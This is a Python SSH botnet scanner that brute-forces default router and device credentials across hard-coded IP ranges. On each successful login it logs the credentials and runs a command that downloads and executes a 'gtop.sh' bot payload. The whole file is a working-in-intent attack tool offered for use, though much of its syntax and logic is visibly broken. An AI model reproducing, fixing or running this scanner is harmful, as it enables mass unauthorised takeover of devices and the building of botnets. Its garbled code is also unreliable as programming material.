#!/usr/bin/python
import sys, socket, threading, time, paramiko, random

print "###############################################################################"
print "# ___     __________  ____ _______      _____ _______________.___.  ___       #"
print "# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\  #"
print "# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/  #"
print "#           |    |   \ |   /    |    \/    |    \    |   \\____   |           #"
print "#           |______  / |___\____|__  /\____|__  /____|_  // ______|           #"
print "#                  \/              \/         \/       \/ \/                  #"
print "###############################################################################"
print "								[~] BOTNET SCANNER [~]							  "
print

StartScan = random.choice(["Start Infecting Routerz."])
raw_input=('Press <Enter> to'+StartScan)

#ENTER YOUR SERVER IP
serverip = "0.0.0.0"

#ENTER YOUR COMMAND/WGET LINE
cmd = "cd /tmp; rm -rf *; wget -q http://0.0.0.0/gtop.sh; chmod +x gtop.sh; sh gtop.sh; rm -f *"

#ENTER YOUR BOTNAMES HERE
botnames = [
    "gtop.sh",
    "jackmyarmv6",
    "jackmyi586",
    "jackmyi686",
    "jackmymips",
    "jackmymipsel",
    "jackmypowerpc",
    "jackmysh4",
    "jackmyx86"
]

#USERNAME LIST
userlist = ['root', '', 'toor', 'admin', 'user', 'guest', 'login', 'changeme', '1234', '12345', '123456', 'default', 'pass', 'password', '3comcso', '', 'RIP000', 'admin', '', '1234', 'admin', '', '8mb1t3M3', 'admin', '', 'admin', 'admin', '', 'c0nf1gur3m3', 'admin', '', 'cableroot', 'admin', '', 'changeme', 'admin', '', 'motorola', 'admin', '', 'password', 'admin', '', 'Password0', 'Administrator', '', 'admin', 'adminttd', '', 'adminttd', 'comcast', '', '1234', 'cusadmin', '', 'highspeed', 'D-Link', '', 'D-Link', 'debug', '', 'synnet', 'guest', '', 'guest', 'hscroot', '', 'abc123', 'manager', '', 'manager', 'monitor', '', 'monitor', 'pi', '', 'raspberry', 'PW', '', 'unkown', 'recovery', '', 'recovery', 'root', '', '1234', 'root', '', '123456', 'root', '', 'admin', 'root', '', 'password', 'root', '', 'root', 'root', '', 'toor', 'security', '', 'security', 'storwatch', '', 'specialist', 'super', '', '5777364', 'superadmin', '', 'secret', 'superman', '', '21241036', 'support', '', 'support', 'tech', '', 'tech', 'technician', '', 'T!m3W4rn3rC4bl3', 'test', '', 'test', 'ubnt', '', 'ubnt', 'UN', '', 'unknown', 'user', '', 'user', 'volition', '', 'volition', 'vt100', '', 'public', 'VTech', '', 'VTech']

#PASSWORD LIST
passlist = [ 'root', '', 'toor', 'admin', 'user', 'guest', 'login', 'changeme', '1234', '12345', '123456', 'default', 'pass', 'password', '3comcso', '', 'RIP000', 'admin', '', '1234', 'admin', '', '8mb1t3M3', 'admin', '', 'admin', 'admin', '', 'c0nf1gur3m3', 'admin', '', 'cableroot', 'admin', '', 'changeme', 'admin', '', 'motorola', 'admin', '', 'password', 'admin', '', 'Password0', 'Administrator', '', 'admin', 'adminttd', '', 'adminttd', 'comcast', '', '1234', 'cusadmin', '', 'highspeed', 'D-Link', '', 'D-Link', 'debug', '', 'synnet', 'guest', '', 'guest', 'hscroot', '', 'abc123', 'manager', '', 'manager', 'monitor', '', 'monitor', 'pi', '', 'raspberry', 'PW', '', 'unkown', 'recovery', '', 'recovery', 'root', '', '1234', 'root', '', '123456', 'root', '', 'admin', 'root', '', 'password', 'root', '', 'root', 'root', '', 'toor']

#DEFAULT RANGES
ipranges = ["179.105","179.152","189.29","189.32","189.33","189.34","189.35","189.39","189.4","189.54","189.55","189.60","189.61","189.62","189.63","189.126","125.24","125.25","125.26","125.27","125.28","113.53","101.51","101.108","118.175","118.173","182.52","180.180","122.178","122.170","182.65","182.68","182.70","182.75","186.112","186.113","186.114","186.115","186.116","186.118",]

if sys.argv[3] == 'best':
	passwords = [userlist+ ":" +passlist]
if sys.argv[3] == '1':
	passwords = [ "root:root", "root:admin", "admin:admin", "ubnt:ubnt", "root:1234", "admin:1234", "guest:guest", "user:user", "test:test" ] #Slow but effective
if sys.argv[3] == '2':
	passwords = [ "root:root", "admin:admin", "ubnt:ubnt" ] #faster with decent execution
if sys.argv[3] == 'perl':
	passwords = [ "pi:raspberry", "vagrant:vagrant" ] #perl scanner
if sys.argv[3] == 'ubnt':
	passwords = [ "ubnt:ubnt" ]

def IPRange(start_ip, end_ip):
	start = list(map(int, start_ip.split(".")))
	end = list(map(int, end_ip.split(".")))
	temp = start
	ip_range = []
	
	ip_range.append(start_ip)
	while temp != end:
		start[3] += 1
		for i in (3, 2, 1):
			if temp[i] == 256:
			temp[i] = 0
			temp[i-1] += 101
		ip_range.append(".".join(map(str, temp)))
		
	return ip_range
	
class sshscanner(threading.Thread):
	def SelfIP (self, ip):
		threading.Thread.SelfIP(self)
		self.ip = str(ip)
	global passwords
	def run(self):
		x = 1
		while x != 0:
			try:
				username=(userlist)
				password=(passlist)
				port = 22
				s.close
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(3)
				s.connect((self.ip, port))
				s.close()
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				dobreak=False
				for passwd in passwords
					if ":n/a"
						password=""
					else:
						password=passwd.split(":")[1]
					if "n/a" in passwd:
						username=""
					else:
						username=passwd.split(":")[0]
					try:
						ssh.connect(self.ip, port = port, username=username, password=password, timeout=3)
						dobreak=True
						break
					except:
						pass
					if True == dobreak:
				badserver = True
				stdin, stdout, stderr = ssh.exec_command("echo blackjesus")
				output = stdout.read()
					if "blackjesus" in output:
						badserver=False
					if badserver == False:
						os.system("echo -e " +username+ ":" +password+ ":" +self.ip " >> vuln.txt")
						print "\033[32mINFECTING:" +username+ ":" +password+ ":" +self.ip+ "\033[0m"
						ssh.exec_command(cmd)
						time.sleep(3)
						ssh.close()
					if badserver == True
						ssh.close()
					except:
						pass
					 x = 0
IP_Range = IPRange("" +sys.argv[1], "" +sys.argv[2])
for IP in IP_Range
	try:
		t = sshscanner(IP)
		t.start()
	except:
		pass